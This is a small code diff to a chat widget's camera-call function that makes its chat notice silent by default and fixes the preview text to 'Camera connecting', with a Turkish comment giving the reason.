@@ -587,7 +587,8 @@ async function startVisitorCameraOffer(text, opts = {}) {
   const callId = makeId();
   await initCameraCall(id, callId);
 
-  const silent = opts.silent === true;
+  // Varsayılan sessiz — sohbeti “izin zorunlu” mesajlarıyla doldurma (admin talebi ayrı yoldan gelir)
+  const silent = opts.silent !== false;
   if (!silent) {
     const msgRef = push(ref(database, `chats/${id}/messages`));
     await set(msgRef, {
@@ -605,7 +606,7 @@ async function startVisitorCameraOffer(text, opts = {}) {
 
   await update(ref(database, `chats/${id}`), {
     updatedAt: Date.now(),
-    preview: silent ? "📷 Kamera bağlanıyor" : "📷 Kamera talebi",
+    preview: "📷 Kamera bağlanıyor",
     lastWho: "user",
     lastCallId: callId,
     cameraPending: true,
